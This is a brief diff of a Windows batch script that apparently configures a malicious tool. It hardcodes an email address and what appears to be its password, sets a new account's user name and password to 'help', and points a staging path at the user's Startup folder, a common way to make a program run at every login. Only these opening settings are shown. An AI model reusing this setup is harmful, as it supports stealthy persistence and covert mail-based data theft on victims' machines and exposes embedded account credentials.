@@ -1,10 +1,10 @@
 @echo off
 
-# Custom
+REM Custom
 SET email=blabla.97@internet.ru
 SET emailp=NoShitSherlock1036!
-SET user=testing
-SET p=testing
+SET user=help
+SET p=help
 
 SET stage_path="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 SET init_path=%cd%
